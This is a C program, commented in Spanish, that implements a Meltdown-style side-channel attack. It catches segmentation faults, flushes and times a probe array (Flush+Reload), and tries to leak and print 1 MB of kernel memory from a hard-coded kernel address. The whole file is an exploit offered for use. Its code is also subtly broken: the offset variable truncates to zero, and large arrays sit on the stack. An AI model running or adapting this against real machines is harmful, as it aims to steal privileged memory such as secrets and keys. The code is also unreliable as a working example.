#include <stdio.h>
#include <stdint.h>
#include <stdbool.h> 
#include <setjmp.h> 
#include <signal.h>
#include <emmintrin.h>  // Para _mm_mfence


#define CACHE_HIT_THRESHOLD 45

// Variable global para almacenar el contexto de setjmp.
jmp_buf env;

// Función manejadora de la señal SIGSEGV que utiliza longjmp para recuperar el flujo.
void segfault_handler(int sig) {
    longjmp(env, 1);
}

// Configura el manejador de señales para SIGSEGV.
void setup_signal_handler() {
    struct sigaction sa;
    sa.sa_handler = segfault_handler;
    sigemptyset(&sa.sa_mask);
    // Se utiliza SA_NODEFER para poder manejar señales de forma recursiva si fuera necesario.
    sa.sa_flags = SA_NODEFER;
    if (sigaction(SIGSEGV, &sa, NULL) < 0) {
        perror("sigaction");
    }
}

// Implementación de la función clflush para vaciar una línea en caché.
static inline void clflush(void *p) {
    __asm__ volatile ("clflush (%0)" :: "r"(p));
}

// Implementación de la función rdtsc para leer el contador de tiempo del CPU.
static inline uint64_t rdtsc() {
    unsigned int lo, hi;
    __asm__ volatile ("rdtsc" : "=a"(lo), "=d"(hi));
    return ((uint64_t)hi << 32) | lo;
}

uint8_t meltdown_attack(uint8_t *address, uint8_t *probe_array) {
    setup_signal_handler(); // Configurar el manejador para SIGSEGV.

    while (true) {
        // Vaciar la caché para cada línea correspondiente en probe_array.
        for (int i = 0; i < 256; i++) {
            clflush(&probe_array[i * 4096]);
        }

        _mm_mfence(); // Barrera de memoria para asegurar el orden de ejecución.

        // Intentar acceder a la memoria protegida con ejecución especulativa.
        if (setjmp(env) == 0) {  // Guarda el contexto y, en caso de fallo, se reanudará aquí.
            uint8_t value = *address;             // Lectura "ilegal" (en un escenario real esto provocaría un fallo).
            uint8_t offset = value * 4096;          // Calcular el desplazamiento (value * tamaño de página).
            volatile uint8_t temp = probe_array[offset]; // Acceso especulativo: se carga la línea de caché correspondiente.
            (void)temp; // Evitar advertencias por variable sin usar.
        }

        // Tras la posible falla, medir los tiempos de acceso para determinar qué página quedó en caché.
        for (int i = 0; i < 256; i++) {
            uint64_t t1 = rdtsc();
            volatile uint8_t dummy = probe_array[i * 4096];
            uint64_t t2 = rdtsc() - t1;

            if (t2 < CACHE_HIT_THRESHOLD) {
                // Se detecta la página 'i' con acceso rápido, lo que indica el byte filtrado.
                return (uint8_t)i;
            }
        }
    }
    return 0;
}

int main() {
    uintptr_t kernel_base = 0xffffffff81000000;
    const size_t leak_size = 1024 * 1024; // 1 MB de datos a leer.
    uint8_t leaked_data[leak_size];       // Buffer para almacenar los datos filtrados.
    uint8_t probe_array[256 * 4096];      // Probe array utilizado para Flush+Reload.
  
    // Iterar sobre las direcciones a partir del kernel_base.
    for (size_t i = 0; i < leak_size; i++) {
        leaked_data[i] = meltdown_attack((uint8_t *)(kernel_base + i), probe_array);
    }

    // Imprimir los datos filtrados, 16 bytes por línea.
    for (size_t i = 0; i < leak_size; i++) {
        printf("%02X ", leaked_data[i]);
        if ((i + 1) % 16 == 0)
            printf("\n");
    }

    return 0;
}
